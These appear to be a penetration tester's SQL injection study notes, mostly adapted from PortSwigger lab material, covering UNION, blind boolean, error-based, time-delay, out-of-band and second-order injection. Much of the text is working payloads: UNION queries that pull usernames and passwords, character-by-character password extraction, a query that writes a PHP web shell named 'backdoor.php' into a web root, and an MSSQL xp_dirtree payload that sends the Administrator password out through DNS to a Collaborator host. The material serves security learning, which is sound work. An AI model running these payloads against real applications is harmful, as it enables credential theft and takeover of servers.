# SQL Basics

## **Types of SQL Databases**

* Mysql
* MSSQL
* PostgreSQL - v9.5 and earlier
  * [https://www.pcwdld.com/sql-cheat-sheet](https://www.pcwdld.com/sql-cheat-sheet)
* Oracle
  * [https://www.pcwdld.com/sql-cheat-sheet](https://www.pcwdld.com/sql-cheat-sheet)
* NoSQL
  * Couch/MongoDB
  * Unstructured Data, grows horizontally
  * Vulnerabilities generally exist where a string is parsed or evaluated into a NoSQL call.
  * Vulnerability injections occur when:
    * Endpoints accepts JSON data in the request to NoSQL databaseS
    * We are able to maniPulate the query using NoSQL comparison operators to change the NoSQL query
  * [https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
  * [https://www.owasp.org/index.php/Testing\_for\_NoSQL\_injection](https://www.owasp.org/index.php/Testing\_for\_NoSQL\_injection)
* SQL Platform Commands
  * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet.md)
  * _RTFM: Databases - pg.73_
  * _PTFM: Databases - pg. 194_

## **SQL Injection locations**

* Most SQL injection vulnerabilities arise within the `WHERE` clause of a `SELECT` query. But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:
  * &#x20;In `UPDATE` statements, within the updated values or the `WHERE` clause.
  * &#x20;In `INSERT` statements, within the inserted values.
  * &#x20;In `SELECT` statements, within the table or column name.
  * &#x20;In `SELECT` statements, within the `ORDER BY` clause.

## **Injection Types**

## Classic Error-based SQLi

This type is SQLi uses error-messages returned from the database as the method to gather information about the backend itself. For more information, see the Basics section above

## **UNION SQL Injection**&#x20;

The SQL `UNION` operator is used to combine the result set of two or more `SELECT` statements, appending the results on the end of the original query. **** An attacker can leverage the SQL vulnerability and find information from other database tables using the `UNION` keyword.

### **UNION Operators**

* The UNION operator, is a method that allows a query to retrieve data from other tables within the database
* The UNION operator allows you to execute one or more additional SELECT queties and append the results to the original query
* In order to work, UNION queries have two key requirements
  * The individual queries must return the same number of columns.
  * The data types in each column must be compatible between the individual queries.
  * &#x20;\*\*\*\*\*Note - you can use either a space or ‘+’ in the injections\*\*\*\*\*

### **Determining the number of columns required for a UNION attack**

* Method 1 - injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
  * Assuming the injection point is a quoted string within the WHERE clause of the original query, you would submit:
    * ' ORDER BY 1--
    * ' ORDER BY 2--
    * ' ORDER BY 3--
    * etc.
  * This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error
  * The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.
* Method 2 - Submitting a series of UNION SELECT payloads specifying a different number of null values:
  * Start by using expanding null satements to find the number of columns
    * ' UNION SELECT NULL--
    * ' UNION SELECT NULL,NULL--
    * ' UNION SELECT NULL,NULL,NULL--
    * etc.
  * If the number of nulls does not match the number of columns, the database returns an error
  * Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code.
* Notes for Oracle and MySQL
  * On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: ' UNION SELECT NULL FROM DUAL--.
  * The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.
* [https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

### **Finding columns with a useful data type in an SQL injection UNION attack**

* Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data
* Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn.
  * ' UNION SELECT+'a',NULL,NULL,NULL--
  * ' UNION SELECT NULL,'a',NULL,NULL--
  * ' UNION SELECT NULL,NULL,'a',NULL--
  * ' UNION SELECT NULL,NULL,NULL,'a'--
* If the data type of a column is not compatible with string data, the injected query will cause a database error
* If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.
* [https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

### **Using a UNION attack to retrieve interesting data**

* When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data
* Use
  * Assuming:
    * The original query returns two columns, both of which can hold string data.
    * The injection point is a quoted string within the WHERE clause.
    * The database contains a table called users with the columns username and password.
  * You can retrieve the contents of the users table by submitting this:
    * ' UNION SELECT username, password FROM users--
  * Of course, the crucial information needed to perform this attack is that there is a table called users with two columns called username and password. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains
* [https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

**Retrieving multiple values within a single column**

* You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values
* On oracle:
  * ' UNION SELECT username || '\~' || password FROM users--
  * This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.
  * The results from the query will let you read all of the usernames and passwords, for example:
  *
  * Note that different databases use different syntax to perform string concatenation.
* [https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

### Union Attack Strings

Upload php command injection file

```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Load file

```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

## Blind SQLi (Inferential)

[https://owasp.org/www-community/attacks/Blind\_SQL\_Injection](https://owasp.org/www-community/attacks/Blind\_SQL\_Injection)

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.\
With blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective, because they rely on being able to see the results of the injected query within the application's responses.

Blind SQL comes in to types:

* Boolean-Based: Which looks at responses in the application based on if the SQLi query is "True" or "False"
* Time-Based: Which determines a "True" or "False" result depending on the time the target application takes to process the query

### **Triggering conditional responses**&#x20;

* Systematically testing with a series of inputs until a given response is made.&#x20;
* To determine the conditional response, test with and always tru and always false query&#x20;
  * xyz' UNION SELECT 'a' WHERE 1=1--&#x20;
  * xyz' UNION SELECT 'a' WHERE 1=2--
* Example:&#x20;
  * xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
    * If this returns with the positive conditional statement, the first character of the password is create than ‘m’&#x20;
  * xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--&#x20;
    * If this does not return with the positive conditional statement, the first character is less than ‘t’&#x20;
  * Repeat until the entire password is discovered
* [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

### I**nducing conditional responses by triggering SQL errors**

* It is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition. This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.
* Example: two requests are sent containing the following `TrackingId` cookie values in turn:
  * &#x20;`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
  * &#x20;`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
* &#x20;These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.
* Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
  * `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
* [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

### **Blind SQL injection by time-delays**

* Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.
* The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:
  * &#x20;`'; IF (1=2) WAITFOR DELAY '0:0:10'--`\
    `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
* &#x20;The first of these inputs will not trigger a delay, because the condition `1=2` is false. The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.
* &#x20;Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
  * `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
* [https://portswigger.net/web-security/sql-injection/blind/lab-time-delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
* [https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)



### **Blind SQL Inejction with OAST techniques**

* OAST - Out-of-band Application Security Testing
* When will standard SQL injection not work?
  * Suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute an SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.
* It is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. More importantly, data can be exfiltrated directly within the network interaction itself.
* There are many options to perform this attack, but typically the most successful is DNS
* Burp Collaborator use
  * This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.
* &#x20;The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:
  * `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
* &#x20;This will cause the database to perform a lookup for the following domain:
  * `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`
* &#x20;Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
  * `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
* &#x20;This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:
  * `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.n`[`et`](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
* [https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
* [https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
* [https://portswigger.net/burp/application-security-testing/oast](https://portswigger.net/burp/application-security-testing/oast)

## Second Order Injection

* &#x20;First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into an SQL query in an unsafe way.
* In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.
